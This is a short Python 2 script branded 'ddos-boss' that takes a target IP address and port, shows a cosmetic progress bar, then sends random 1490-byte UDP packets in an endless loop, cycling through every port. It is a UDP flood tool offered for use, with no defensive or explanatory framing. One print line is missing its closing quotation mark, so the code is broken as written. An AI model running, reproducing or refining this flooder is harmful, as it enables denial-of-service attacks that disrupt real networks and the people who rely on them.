import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

###############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
###############

os.system("clear")
os.system("figlet ddos-boss")
print
print "Rahat_Vau"

print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet kam suru")
print "[                    ] 0% "
time.sleep(8)
print "[===                 ] 20%"
time.sleep(8)
print "[=====               ] 30%"
time.sleep(8)
print "[=======             ] 45%"
time.sleep(8)
print "[==========          ] 60%"
time.sleep(8) 
print "[=============       ] 75%"
time.sleep(8)
print "[===============     ] 80%"
time.sleep(8)
print "[==================  ] 90%
time.sleep(8)
print "[====================] 100%"
time.sleep(8)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
